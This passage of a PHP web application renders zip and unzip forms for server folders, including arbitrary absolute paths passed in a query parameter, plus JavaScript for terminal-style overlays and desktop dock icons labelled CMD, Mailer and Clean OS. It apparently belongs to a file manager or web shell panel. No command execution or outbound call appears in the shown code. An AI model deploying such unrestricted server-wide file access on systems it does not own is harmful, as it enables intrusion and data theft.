    echo '<h3 class="section-title"><svg class="unzip-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" role="img" aria-label="Unzip"><linearGradient id="unzip_form_abs_gr1" x1="9.722" x2="36.896" y1="9.722" y2="36.896" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#f44f5a"/><stop offset=".443" stop-color="#ee3d4a"/><stop offset="1" stop-color="#e52030"/></linearGradient><path fill="url(#unzip_form_abs_gr1)" d="M13.42,40.014l-8.824-15c-0.368-0.626-0.368-1.402,0-2.028l8.824-15 C13.779,7.375,14.435,7,15.144,7h17.712c0.709,0,1.365,0.375,1.724,0.986l8.824,15c0.368,0.626,0.368,1.402,0,2.028l-8.824,15 C34.221,40.625,33.565,41,32.856,41H15.144C14.435,41,13.779,40.625,13.42,40.014z"/></svg> Unzip: ' . h(basename($zipPath)) . '</h3>';
                echo '<form method="post" class="form-wrap">';
                echo '<input type="hidden" name="do_unzip_abs" value="1">';
echo '<input type="hidden" name="os" value="' . h($zipPath) . '">';
                $defaultFolder = pathinfo($zipPath, PATHINFO_FILENAME);
                echo '<div class="input-pill" style="margin:12px auto; max-width:480px;"><span class="material-symbols-rounded">create_new_folder</span><input type="text" name="folder" value="' . h($defaultFolder) . '" placeholder="Extract to folder" autocomplete="off"></div>';
                echo '<p class="form-actions"><button class="icon-action icon-confirm" type="submit" title="Unzip"><span class="material-symbols-rounded">check_circle</span></button></p>';
                echo '</form>';
                // Preview entries for absolute zip
                $unzEntriesAbs = [];
                if (class_exists('ZipArchive')) {
                    $tmpZip2 = new ZipArchive();
                    if (@$tmpZip2->open($zipPath) === true) {
                        $limit2 = 200;
                        for ($i2 = 0; $i2 < $tmpZip2->numFiles && $i2 < $limit2; $i2++) {
                            $name2 = (string)$tmpZip2->getNameIndex($i2);
                            if ($name2 !== '') { $unzEntriesAbs[] = $name2; }
                        }
                        @$tmpZip2->close();
                    }
                }
                if (!empty($unzEntriesAbs)) {
                    echo '<div class="unz-preview" style="max-width:560px; margin:8px auto; display:grid; grid-template-columns: 1fr; gap:6px; text-align:left;">';
                    $shown2 = 0; $limitShow2 = 50;
                    foreach ($unzEntriesAbs as $entry2) {
                        if ($shown2 >= $limitShow2) { break; }
                        $isDirEntry2 = substr($entry2, -1) === '/';
                        $disp2 = $isDirEntry2 ? rtrim($entry2, '/') : basename($entry2);
                        if ($isDirEntry2) {
                            $i2 = '<span class="material-symbols-rounded ic-folder">folder</span>';
                        } else {
                            $ext3 = strtolower(pathinfo($disp2, PATHINFO_EXTENSION));
                            if (in_array($ext3, ['mp3','wav','flac','m4a','aac','ogg','opus'], true)) { $i2 = '<span class="material-symbols-rounded ic-audio">audio_file</span>'; }
                            elseif (in_array($ext3, ['mp4','webm','mkv','mov','avi','wmv','mpg','mpeg','3gp','3gpp'], true)) { $i2 = '<span class="material-symbols-rounded ic-video">video_file</span>'; }
                            elseif (in_array($ext3, ['jpg','jpeg','png','gif','webp','bmp','svg'], true)) { $i2 = '<span class="material-symbols-rounded ic-image">image</span>'; }
                            elseif ($ext3 === 'zip') { $i2 = '<svg class="zip-icon" viewBox="0 0 24 24" role="img" aria-label="ZIP"><rect x="5" y="3" width="14" height="6" rx="2" fill="#8a2be2"/><rect x="5" y="9" width="14" height="6" rx="2" fill="#1e90ff"/><rect x="5" y="15" width="14" height="6" rx="2" fill="#32cd32"/><rect x="10.5" y="3" width="3" height="18" rx="1.5" fill="#cfa15c"/><rect x="10.5" y="9" width="3" height="2" rx="1" fill="#b6893f"/></svg>'; }
                            elseif ($ext3 === 'txt') { $i2 = '<span class="material-symbols-rounded ic-txt">sticky_note_2</span>'; }
                            elseif ($ext3 === 'php') { $i2 = '<i class="fa-brands fa-php ic-php"></i>'; }
                            elseif ($ext3 === 'html' || $ext3 === 'htm') { $i2 = '<i class="fa-brands fa-html5 ic-html"></i>'; }
                            elseif ($ext3 === 'js') { $i2 = '<i class="fa-brands fa-js ic-js"></i>'; }
                            elseif ($ext3 === 'css') { $i2 = '<i class="fa-brands fa-css3 ic-css"></i>'; }
                            elseif ($ext3 === 'py') { $i2 = '<i class="fa-brands fa-python ic-python"></i>'; }
                            else { $i2 = '<span class="material-symbols-rounded ic-file">file_present</span>'; }
                        }
                        echo '<div class="unz-item" style="display:flex; align-items:center; gap:8px;"><span class="th-icon" aria-hidden="true">' . $i2 . '</span><span class="name-ellipsis" title="' . h($disp2) . '">' . h($disp2) . '</span></div>';
                        $shown2++;
                    }
                    if (count($unzEntriesAbs) > $limitShow2) { echo '<div class="muted" style="font-size:12px;">…</div>'; }
                    echo '</div>';
                }
            }
        }

        // Zip folder form
        if (isset($_GET['zip']) && !empty($_GET['d'])) {
            $dirPath = safePath($BASE_DIR, (string)$_GET['d']);
            if ($dirPath && is_dir($dirPath)) {
                // Default to date-time-zip.zip (e.g., 20241103-104522-zip.zip)
                $defaultZip = date('Ymd-His') . '-zip.zip';
                // Gather up to 200 entries from directory for animation (relative paths)
                $zipEntries = [];
                $baseLen = strlen($dirPath);
                $limit = 200;
                $it = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($dirPath, FilesystemIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::SELF_FIRST
                );
                foreach ($it as $f) {
                    $p = (string)$f;
                    $rel = ltrim(substr($p, $baseLen), DIRECTORY_SEPARATOR);
                    if ($rel !== '') { $zipEntries[] = $rel; }
                    if (count($zipEntries) >= $limit) { break; }
                }
                $zipJson = h(json_encode($zipEntries));
                echo '<h3 class="section-title" style="text-align:center;"><svg class="zip-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" role="img" aria-label="Zip"><linearGradient id="zip_form_rel_hdr_gr1" x1="9.722" x2="36.896" y1="9.722" y2="36.896" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#f44f5a"/><stop offset=".443" stop-color="#ee3d4a"/><stop offset="1" stop-color="#e52030"/></linearGradient><path fill="url(#zip_form_rel_hdr_gr1)" d="M13.42,40.014l-8.824-15c-0.368-0.626-0.368-1.402,0-2.028l8.824-15 C13.779,7.375,14.435,7,15.144,7h17.712c0.709,0,1.365,0.375,1.724,0.986l8.824,15c0.368,0.626,0.368,1.402,0,2.028l-8.824,15 C34.221,40.625,33.565,41,32.856,41H15.144C14.435,41,13.779,40.625,13.42,40.014z"/></svg> Zip: ' . h(basename($dirPath)) . '</h3>';
                echo '<form method="post" class="form-wrap" id="zip-form" data-entries="' . $zipJson . '" style="text-align:center;">';
                echo '<input type="hidden" name="do_zip" value="1">';
                $relForm = ltrim(str_replace($BASE_DIR . DIRECTORY_SEPARATOR, '', $dirPath), DIRECTORY_SEPARATOR);
                echo '<input type="hidden" name="rel" value="' . h($relForm) . '">';
                echo '<div class="input-pill" style="margin:12px auto; max-width:480px;"><svg class="zip-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" role="img" aria-label="ZIP"><linearGradient id="zip_form_rel_gr1" x1="9.722" x2="36.896" y1="9.722" y2="36.896" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#f44f5a"/><stop offset=".443" stop-color="#ee3d4a"/><stop offset="1" stop-color="#e52030"/></linearGradient><path fill="url(#zip_form_rel_gr1)" d="M13.42,40.014l-8.824-15c-0.368-0.626-0.368-1.402,0-2.028l8.824-15 C13.779,7.375,14.435,7,15.144,7h17.712c0.709,0,1.365,0.375,1.724,0.986l8.824,15c0.368,0.626,0.368,1.402,0,2.028l-8.824,15 C34.221,40.625,33.565,41,32.856,41H15.144C14.435,41,13.779,40.625,13.42,40.014z"/></svg><input type="text" name="zipname" value="' . h($defaultZip) . '" placeholder="Archive name" autocomplete="off"></div>';
                echo '<p class="form-actions"><button class="icon-action icon-confirm" type="submit" title="Create ZIP"><span class="material-symbols-rounded">check_circle</span></button></p>';
                echo '</form>';
            }
        }
        // Zip folder form (absolute)
if ($isOutsideBase && isset($_GET['zip_abs']) && !empty($_GET['os'])) {
    $dirPath = realpath((string)$_GET['os']);
            if ($dirPath !== false && is_dir($dirPath)) {
                $defaultZip = date('Ymd-His') . '-zip.zip';
                echo '<h3 class="section-title"><svg class="zip-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" role="img" aria-label="Zip"><linearGradient id="zip_form_abs_hdr_gr1" x1="9.722" x2="36.896" y1="9.722" y2="36.896" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#f44f5a"/><stop offset=".443" stop-color="#ee3d4a"/><stop offset="1" stop-color="#e52030"/></linearGradient><path fill="url(#zip_form_abs_hdr_gr1)" d="M13.42,40.014l-8.824-15c-0.368-0.626-0.368-1.402,0-2.028l8.824-15 C13.779,7.375,14.435,7,15.144,7h17.712c0.709,0,1.365,0.375,1.724,0.986l8.824,15c0.368,0.626,0.368,1.402,0,2.028l-8.824,15 C34.221,40.625,33.565,41,32.856,41H15.144C14.435,41,13.779,40.625,13.42,40.014z"/></svg> Zip: ' . h(basename($dirPath)) . '</h3>';
                echo '<form method="post" class="form-wrap">';
                echo '<input type="hidden" name="do_zip_abs" value="1">';
echo '<input type="hidden" name="os" value="' . h($dirPath) . '">';
                echo '<div class="input-pill" style="margin:12px auto; max-width:480px;"><svg class="zip-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" role="img" aria-label="ZIP"><linearGradient id="zip_form_abs_gr1" x1="9.722" x2="36.896" y1="9.722" y2="36.896" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#f44f5a"/><stop offset=".443" stop-color="#ee3d4a"/><stop offset="1" stop-color="#e52030"/></linearGradient><path fill="url(#zip_form_abs_gr1)" d="M13.42,40.014l-8.824-15c-0.368-0.626-0.368-1.402,0-2.028l8.824-15 C13.779,7.375,14.435,7,15.144,7h17.712c0.709,0,1.365,0.375,1.724,0.986l8.824,15c0.368,0.626,0.368,1.402,0,2.028l-8.824,15 C34.221,40.625,33.565,41,32.856,41H15.144C14.435,41,13.779,40.625,13.42,40.014z"/></svg><input type="text" name="zipname" value="' . h($defaultZip) . '" placeholder="Archive name (.zip)" autocomplete="off"></div>';
                echo '<p class="form-actions"><button class="icon-action icon-confirm" type="submit" title="Zip"><span class="material-symbols-rounded">check_circle</span></button></p>';
                echo '</form>';
            }
        }
        ?>
    </div>
    <!-- Download terminal overlay (CMD-style) -->
    <div class="overlay-terminal" id="dl-terminal-overlay" role="dialog" aria-modal="true" aria-label="Downloading">
        <div class="terminal-modal" role="document">
            <div class="titlebar">
                <div class="traffic">
                    <span class="dot red"></span>
                    <span class="dot yellow"></span>
                    <span class="dot green"></span>
                </div>
                <div class="title"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 48 48" aria-hidden="true"><rect width="14" height="7" x="17" y="8" fill="#999"></rect><path fill="#666" d="M43,8H31v7h14v-5C45,8.895,44.105,8,43,8z"></path><path fill="#ccc" d="M5,8c-1.105,0-2,0.895-2,2v5h14V8H5z"></path><linearGradient id="u8UbA7GmcDgkSbOtELVhra_WbRVMGxHh74X_t3" x1="3.594" x2="44.679" y1="13.129" y2="39.145" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#4c4c4c"></stop><stop offset="1" stop-color="#343434"></stop></linearGradient><path fill="url(#u8UbA7GmcDgkSbOtELVhra_WbRVMGxHh74X_t3)" d="M45,13H3v25c0,1.105,0.895,2,2,2h38c1.105,0,2-0.895,2-2V13z"></path><path d="M10.889,18.729l-2.197,2.197c-0.352,0.352-0.352,0.924,0,1.276l4.271,4.271l-4.325,4.325c-0.352,0.352-0.352,0.924,0,1.276l2.197,2.197c0.353,0.352,0.924,0.352,1.276,0l7.16-7.161c0.352-0.352,0.352-0.924,0-1.276l-7.106-7.106C11.813,18.376,11.242,18.376,10.889,18.729z" opacity=".07"></path></svg> --zsh</div>
            </div>
            <div class="body">
                <div class="output" id="dl-term-output">C:\> </div>
            </div>
        </div>
    </div>

    <!-- Operation terminal overlay for Zip/Unzip -->
    <div class="overlay-terminal" id="op-terminal-overlay" role="dialog" aria-modal="true" aria-label="Operation">
        <div class="terminal-modal" role="document">
            <div class="titlebar">
                <div class="traffic">
                    <span class="dot red"></span>
                    <span class="dot yellow"></span>
                    <span class="dot green"></span>
                </div>
                <div class="title"><span class="material-symbols-rounded" aria-hidden="true">terminal</span> --zsh</div>
                <button class="term-close" id="op-term-close-btn" title="Close" aria-label="Close"><span class="material-symbols-rounded" aria-hidden="true">cancel</span></button>
            </div>
            <div class="body">
                <div class="output" id="op-term-output">C:\> </div>
            </div>
        </div>
    </div>

    <!-- Image preview terminal overlay -->
    <div class="overlay-terminal" id="img-terminal-overlay" role="dialog" aria-modal="true" aria-label="Image Preview">
        <div class="terminal-modal" role="document">
            <div class="titlebar">
                <div class="traffic">
                    <span class="dot red"></span>
                    <span class="dot yellow"></span>
                    <span class="dot green"></span>
                </div>
                <div class="title"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 48 48" aria-hidden="true"><rect width="14" height="7" x="17" y="8" fill="#999"></rect><path fill="#666" d="M43,8H31v7h14v-5C45,8.895,44.105,8,43,8z"></path><path fill="#ccc" d="M5,8c-1.105,0-2,0.895-2,2v5h14V8H5z"></path><linearGradient id="u8UbA7GmcDgkSbOtELVhra_WbRVMGxHh74X_t4" x1="3.594" x2="44.679" y1="13.129" y2="39.145" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#4c4c4c"></stop><stop offset="1" stop-color="#343434"></stop></linearGradient><path fill="url(#u8UbA7GmcDgkSbOtELVhra_WbRVMGxHh74X_t4)" d="M45,13H3v25c0,1.105,0.895,2,2,2h38c1.105,0,2-0.895,2-2V13z"></path><path d="M10.889,18.729l-2.197,2.197c-0.352,0.352-0.352,0.924,0,1.276l4.271,4.271l-4.325,4.325c-0.352,0.352-0.352,0.924,0,1.276l2.197,2.197c0.353,0.352,0.924,0.352,1.276,0l7.16-7.161c0.352-0.352,0.352-0.924,0-1.276l-7.106-7.106C11.813,18.376,11.242,18.376,10.889,18.729z" opacity=".07"></path></svg> ~ $ preview --zsh</div>
                <button class="term-close" id="img-term-close-btn" title="Close" aria-label="Close"><span class="material-symbols-rounded" aria-hidden="true">cancel</span></button>
            </div>
            <div class="body">
                <div class="output" id="img-term-output">C:\> preview image
                </div>
                <div class="img-wrap" style="margin-top:12px; display:flex; align-items:center; justify-content:center;">
                    <img id="img-preview" alt="Image preview" style="max-width:100%; max-height:60vh; border:1px solid rgba(255,255,255,0.08); border-radius:8px;" />
                </div>
            </div>
        </div>
    </div>

    <!-- Delete confirmation terminal overlay (type 'yes' and Enter) -->
    <div class="overlay-terminal" id="del-terminal-overlay" role="dialog" aria-modal="true" aria-label="Delete Confirmation" tabindex="-1">
        <div class="terminal-modal" role="document">
            <div class="titlebar">
                <div class="traffic">
                    <span class="dot red"></span>
                    <span class="dot yellow"></span>
                    <span class="dot green"></span>
                </div>
                <div class="title"><span class="material-symbols-rounded" aria-hidden="true">terminal</span> --zsh</div>
                <button class="term-close" id="del-term-close-btn" title="Close" aria-label="Close"><span class="material-symbols-rounded" aria-hidden="true">cancel</span></button>
            </div>
            <div class="body">
                <div class="output" id="del-term-output">~ % warning</div>
                <!-- Typing happens directly in terminal output; no visible input field -->
            </div>
        </div>
    </div>

    

    <script>
        (function(){
          // (Message and confirm overlay handlers removed per revert)
          // Minimize/restore logic for terminal chrome yellow dot
          var minimizeBtn = document.getElementById('term-minimize');
          var dockBtn = document.getElementById('dock-terminal-btn');
          var dock = document.getElementById('terminal-dock');
          var notesDockBtn = document.getElementById('dock-notes-btn');
          var notesDock = document.getElementById('notes-dock');
          var browserDockBtn = document.getElementById('dock-browser-btn');
          var browserDock = document.getElementById('browser-dock');
          var cmdDockBtn = document.getElementById('dock-cmd-btn');
          var cmdDock = document.getElementById('cmd-dock');
          var wpDockBtn = document.getElementById('dock-wallpaper-btn');
          var wpDock = document.getElementById('wallpaper-dock');
          var mailDockBtn = document.getElementById('dock-mailer-btn');
          var mailDock = document.getElementById('mailer-dock');
          var settingsDockBtn = document.getElementById('dock-settings-btn');
          var settingsDock = document.getElementById('settings-dock');
          // New dock icons: Errors, APPTools, Clean OS
          var errorsDockBtn = document.getElementById('dock-errors-btn');
          var errorsDock = document.getElementById('errors-dock');
          var apptoolsDockBtn = document.getElementById('dock-apptools-btn');
          var apptoolsDock = document.getElementById('apptools-dock');
          var cleanDockBtn = document.getElementById('dock-clean-btn');
          var cleanDock = document.getElementById('clean-dock');
          var dragging = false, offsetX = 0, offsetY = 0;
          var dockPos = null; // remember last position while minimized
          var lastTapTime = 0; // for touch double-tap
          var notesDragging = false, notesOffsetX = 0, notesOffsetY = 0;
          var notesDockPos = null; // remember notes position while minimized
          var notesLastTapTime = 0;
          var browserDragging = false, browserOffsetX = 0, browserOffsetY = 0;
          var browserDockPos = null;
          var browserLastTapTime = 0;
          var cmdDragging = false, cmdOffsetX = 0, cmdOffsetY = 0;
          var cmdDockPos = null;
          var cmdLastTapTime = 0;
          var wpDragging = false, wpOffsetX = 0, wpOffsetY = 0;
          var wpDockPos = null;
          var wpLastTapTime = 0;
          var mailDragging = false, mailOffsetX = 0, mailOffsetY = 0;
          var mailDockPos = null;
          var mailLastTapTime = 0;
          var settingsDragging = false, settingsOffsetX = 0, settingsOffsetY = 0;
          var settingsDockPos = null;
          function updateDockLabelPosition(btn){
            if (!btn) return;
            var rect = btn.getBoundingClientRect();
            var threshold = 72; // icon(48) + gap + label height approx
            if ((window.innerHeight - rect.bottom) < threshold) {
              btn.classList.add('label-top');
            } else {
              btn.classList.remove('label-top');
            }
          }
          // Errors dock behavior
          if (errorsDockBtn) {
            errorsDockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              var trigger = document.getElementById('errors-trigger');
              if (trigger) { trigger.click(); } else if (typeof spawnErrorsWindow === 'function') { spawnErrorsWindow(); }
            });
            errorsDockBtn.addEventListener('touchend', function(ev){
              var trigger = document.getElementById('errors-trigger');
              if (trigger) { trigger.click(); } else if (typeof spawnErrorsWindow === 'function') { spawnErrorsWindow(); }
            }, { passive: true });
          }
          // APPTools dock behavior
          if (apptoolsDockBtn) {
            apptoolsDockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              var trigger = document.getElementById('apptools-trigger');
              if (trigger) { trigger.click(); } else if (typeof spawnAppToolsWindow === 'function') { spawnAppToolsWindow(); }
            });
            apptoolsDockBtn.addEventListener('touchend', function(ev){
              var trigger = document.getElementById('apptools-trigger');
              if (trigger) { trigger.click(); } else if (typeof spawnAppToolsWindow === 'function') { spawnAppToolsWindow(); }
            }, { passive: true });
          }
          // Clean OS dock behavior
          if (cleanDockBtn) {
            cleanDockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              var trigger = document.getElementById('clean-trigger');
              if (trigger) { trigger.click(); } else if (typeof spawnCleanWindow === 'function') { spawnCleanWindow(); }
            });
            cleanDockBtn.addEventListener('touchend', function(ev){
              var trigger = document.getElementById('clean-trigger');
              if (trigger) { trigger.click(); } else if (typeof spawnCleanWindow === 'function') { spawnCleanWindow(); }
            }, { passive: true });
          }
          // Position dock icons in a centered 2x4 grid by default (movable later)
          function positionDockRow(){
            var centerX = window.innerWidth / 2;
            var centerY = window.innerHeight / 2;
            var spacingX = 96;   // horizontal spacing between icons
            var spacingY = 140;  // vertical spacing between rows (icon + label gap)
            var row1Top = Math.round(centerY - (spacingY/2));
            var row2Top = Math.round(centerY + (spacingY/2)); // symmetric below center
            var row3Top = Math.round(centerY + (spacingY * 1.5)); // extra row for new apps

            // Top row (left ➜ right): Settings, Wallpaper, Mailer
            if (settingsDockBtn && !settingsDockPos) {
              var settingsW = settingsDockBtn.offsetWidth || 48;
              var settingsLeft = centerX - spacingX - (settingsW/2);
              settingsDockBtn.style.transition = 'none';
              settingsDockBtn.style.transform = 'none';
              settingsDockBtn.style.left = settingsLeft + 'px';
              settingsDockBtn.style.top = row1Top + 'px';
              updateDockLabelPosition(settingsDockBtn);
            }
            if (wpDockBtn && !wpDockPos) {
              var wpW = wpDockBtn.offsetWidth || 48;
              var wpLeft = centerX - (wpW/2);
              wpDockBtn.style.transition = 'none';
              wpDockBtn.style.transform = 'none';
              wpDockBtn.style.left = wpLeft + 'px';
              wpDockBtn.style.top = row1Top + 'px';
              updateDockLabelPosition(wpDockBtn);
            }
            if (mailDockBtn && !mailDockPos) {
              var mailW = mailDockBtn.offsetWidth || 48;
              var mailLeft = centerX + spacingX - (mailW/2);
              mailDockBtn.style.transition = 'none';
              mailDockBtn.style.transform = 'none';
              mailDockBtn.style.left = mailLeft + 'px';
              mailDockBtn.style.top = row1Top + 'px';
              updateDockLabelPosition(mailDockBtn);
            }

            // Bottom row (left ➜ right): CMD, Browser, APP 2.0, Notes
            if (cmdDockBtn && !cmdDockPos) {
              var cmdW = cmdDockBtn.offsetWidth || 48;
              var cmdLeft = centerX - (spacingX * 1.5) - (cmdW/2);
              cmdDockBtn.style.transition = 'none';
              cmdDockBtn.style.transform = 'none';
              cmdDockBtn.style.left = cmdLeft + 'px';
              cmdDockBtn.style.top = row2Top + 'px';
              updateDockLabelPosition(cmdDockBtn);
            }
            if (browserDockBtn && !browserDockPos) {
              var browserW = browserDockBtn.offsetWidth || 48;
              var browserLeft = centerX - (spacingX * 0.5) - (browserW/2);
              browserDockBtn.style.transition = 'none';
              browserDockBtn.style.transform = 'none';
              browserDockBtn.style.left = browserLeft + 'px';
              browserDockBtn.style.top = row2Top + 'px';
              updateDockLabelPosition(browserDockBtn);
            }
            if (dockBtn && !dockPos) {
              var appW = dockBtn.offsetWidth || 48;
              var appLeft = centerX + (spacingX * 0.5) - (appW/2);
              dockBtn.style.transition = 'none';
              dockBtn.style.transform = 'none';
              dockBtn.style.left = appLeft + 'px';
              dockBtn.style.top = row2Top + 'px';
              updateDockLabelPosition(dockBtn);
            }
            if (notesDockBtn && !notesDockPos) {
              var notesW = notesDockBtn.offsetWidth || 48;
              var notesLeft = centerX + (spacingX * 1.5) - (notesW/2);
              notesDockBtn.style.transition = 'none';
              notesDockBtn.style.transform = 'none';
              notesDockBtn.style.left = notesLeft + 'px';
              notesDockBtn.style.top = row2Top + 'px';
              updateDockLabelPosition(notesDockBtn);
            }
            // Third row (left ➜ right): Errors, APPTools 1.0, Clean OS
            if (errorsDockBtn) {
              var errW = errorsDockBtn.offsetWidth || 48;
              var errLeft = centerX - spacingX - (errW/2);
              errorsDockBtn.style.transition = 'none';
              errorsDockBtn.style.transform = 'none';
              errorsDockBtn.style.left = errLeft + 'px';
              errorsDockBtn.style.top = row3Top + 'px';
              updateDockLabelPosition(errorsDockBtn);
            }
            if (apptoolsDockBtn) {
              var appTW = apptoolsDockBtn.offsetWidth || 48;
              var appTLeft = centerX - (appTW/2);
              apptoolsDockBtn.style.transition = 'none';
              apptoolsDockBtn.style.transform = 'none';
              apptoolsDockBtn.style.left = appTLeft + 'px';
              apptoolsDockBtn.style.top = row3Top + 'px';
              updateDockLabelPosition(apptoolsDockBtn);
            }
            if (cleanDockBtn) {
              var cleanW = cleanDockBtn.offsetWidth || 48;
              var cleanLeft = centerX + spacingX - (cleanW/2);
              cleanDockBtn.style.transition = 'none';
              cleanDockBtn.style.transform = 'none';
              cleanDockBtn.style.left = cleanLeft + 'px';
              cleanDockBtn.style.top = row3Top + 'px';
              updateDockLabelPosition(cleanDockBtn);
            }
          }
          if (minimizeBtn) {
            minimizeBtn.addEventListener('click', function(){
              if (dock) dock.style.display = 'block';
              if (notesDock) notesDock.style.display = 'block';
              if (browserDock) browserDock.style.display = 'block';
              if (cmdDock) cmdDock.style.display = 'block';
              if (mailDock) mailDock.style.display = 'block';
              if (wpDock) wpDock.style.display = 'block';
              if (settingsDock) settingsDock.style.display = 'block';
              if (errorsDock) errorsDock.style.display = 'block';
              if (apptoolsDock) apptoolsDock.style.display = 'block';
              if (cleanDock) cleanDock.style.display = 'block';
              if (dockBtn && dockPos) {
                dockBtn.style.transform = 'none';
                dockBtn.style.left = dockPos.left + 'px';
                dockBtn.style.top = dockPos.top + 'px';
                updateDockLabelPosition(dockBtn);
              }
              if (cmdDockBtn && cmdDockPos) {
                cmdDockBtn.style.transform = 'none';
                cmdDockBtn.style.left = cmdDockPos.left + 'px';
                cmdDockBtn.style.top = cmdDockPos.top + 'px';
                updateDockLabelPosition(cmdDockBtn);
              }
              if (browserDockBtn && browserDockPos) {
                browserDockBtn.style.transform = 'none';
                browserDockBtn.style.left = browserDockPos.left + 'px';
                browserDockBtn.style.top = browserDockPos.top + 'px';
                updateDockLabelPosition(browserDockBtn);
              }
              if (notesDockBtn && notesDockPos) {
                notesDockBtn.style.transform = 'none';
                notesDockBtn.style.left = notesDockPos.left + 'px';
                notesDockBtn.style.top = notesDockPos.top + 'px';
                updateDockLabelPosition(notesDockBtn);
              }
              if (mailDockBtn && mailDockPos) {
                mailDockBtn.style.transform = 'none';
                mailDockBtn.style.left = mailDockPos.left + 'px';
                mailDockBtn.style.top = mailDockPos.top + 'px';
                updateDockLabelPosition(mailDockBtn);
              }
              if (wpDockBtn && wpDockPos) {
                wpDockBtn.style.transform = 'none';
                wpDockBtn.style.left = wpDockPos.left + 'px';
                wpDockBtn.style.top = wpDockPos.top + 'px';
                updateDockLabelPosition(wpDockBtn);
              }
              if (settingsDockBtn && settingsDockPos) {
                settingsDockBtn.style.transform = 'none';
                settingsDockBtn.style.left = settingsDockPos.left + 'px';
                settingsDockBtn.style.top = settingsDockPos.top + 'px';
                updateDockLabelPosition(settingsDockBtn);
              }
              positionDockRow();
              var shell = document.querySelector('.container') || document.querySelector('.terminal-chrome');
              var bar = document.querySelector('.terminal-chrome');
              var cmdBar = document.querySelector('.command-bar');
              var target = dockBtn;
              var sx = 0, sy = 0;
              if (shell && target) {
                var sr = shell.getBoundingClientRect();
                var tr = target.getBoundingClientRect();
                var scx = sr.left + (sr.width/2);
                var scy = sr.top + (sr.height/2);
                var tcx = tr.left + (tr.width/2);
                var tcy = tr.top + (tr.height/2);
                sx = tcx - scx;
                sy = tcy - scy;
              } else {
                var wcx = window.innerWidth/2;
                var wcy = window.innerHeight/2;
                if (shell) {
                  var sr2 = shell.getBoundingClientRect();
                  var scx2 = sr2.left + (sr2.width/2);
                  var scy2 = sr2.top + (sr2.height/2);
                  sx = wcx - scx2;
                  sy = wcy - scy2;
                }
              }
              var elements = [];
              if (bar) elements.push(bar);
              if (cmdBar) elements.push(cmdBar);
              if (shell && shell !== bar) elements.push(shell);
              var opts = { duration: 420, easing: 'cubic-bezier(.2,.7,.2,1)', fill: 'both' };
              var keyframes = [
                { transform: 'none', opacity: 1, filter: 'none' },
                { transform: 'translate(' + sx + 'px,' + sy + 'px) scale(0.65)', opacity: 0, filter: 'blur(6px)' }
              ];
              var animations = elements.map(function(el){ return el.animate(keyframes, opts); });
              if (dockBtn) { dockBtn.animate([{ transform: 'scale(1)' }, { transform: 'scale(1.12)' }, { transform: 'scale(1)' }], { duration: 420, easing: 'ease-out', fill: 'none' }); }
              var done = 0;
              function finish(){
                document.body.classList.add('minimized');
                elements.forEach(function(el){ el.style.transform = ''; el.style.opacity = ''; el.style.filter = ''; });
              }
              if (!animations.length) { finish(); return; }
              animations.forEach(function(a){ a.onfinish = function(){ done++; if (done >= animations.length) finish(); }; });
            });
          }
          if (dockBtn) {
            // Single click: restore
            dockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              if (dragging) return;
              document.body.classList.remove('minimized');
              var shell = document.querySelector('.container') || document.querySelector('.terminal-chrome');
              var bar = document.querySelector('.terminal-chrome');
              var cmdBar = document.querySelector('.command-bar');
              var target = dockBtn;
              var sx = 0, sy = 0;
              if (shell && target) {
                var sr = shell.getBoundingClientRect();
                var tr = target.getBoundingClientRect();
                var scx = sr.left + (sr.width/2);
                var scy = sr.top + (sr.height/2);
                var tcx = tr.left + (tr.width/2);
                var tcy = tr.top + (tr.height/2);
                sx = tcx - scx;
                sy = tcy - scy;
              }
              var startT = 'translate(' + sx + 'px,' + sy + 'px) scale(0.65)';
              var elements = [];
              if (bar) elements.push(bar);
              if (cmdBar) elements.push(cmdBar);
              if (shell && shell !== bar) elements.push(shell);
              elements.forEach(function(el){ el.style.transform = startT; el.style.opacity = '0'; el.style.filter = 'blur(6px)'; });
              var opts = { duration: 420, easing: 'cubic-bezier(.2,.7,.2,1)', fill: 'both' };
              var keyframes = [
                { transform: startT, opacity: 0, filter: 'blur(6px)' },
                { transform: 'none', opacity: 1, filter: 'none' }
              ];
              if (dockBtn) { dockBtn.animate([{ transform: 'scale(1)' }, { transform: 'scale(1.12)' }, { transform: 'scale(1)' }], { duration: 360, easing: 'ease-out', fill: 'none' }); }
              var animations = elements.map(function(el){ return el.animate(keyframes, opts); });
              var done = 0;
              function after(){
                elements.forEach(function(el){ el.style.transform = ''; el.style.opacity = ''; el.style.filter = ''; });
                if (dock) dock.style.display = 'none';
                if (notesDock) notesDock.style.display = 'none';
                if (browserDock) browserDock.style.display = 'none';
                if (cmdDock) cmdDock.style.display = 'none';
                if (mailDock) mailDock.style.display = 'none';
                if (wpDock) wpDock.style.display = 'none';
                if (settingsDock) settingsDock.style.display = 'none';
                if (errorsDock) errorsDock.style.display = 'none';
                if (apptoolsDock) apptoolsDock.style.display = 'none';
                if (cleanDock) cleanDock.style.display = 'none';
              }
              if (!animations.length) { after(); return; }
              animations.forEach(function(a){ a.onfinish = function(){ done++; if (done >= animations.length) after(); }; });
            });
            // Touch: single-tap to restore
            dockBtn.addEventListener('touchend', function(ev){
              if (dragging) return;
              document.body.classList.remove('minimized');
              var shell = document.querySelector('.container') || document.querySelector('.terminal-chrome');
              var bar = document.querySelector('.terminal-chrome');
              var cmdBar = document.querySelector('.command-bar');
              var target = dockBtn;
              var sx = 0, sy = 0;
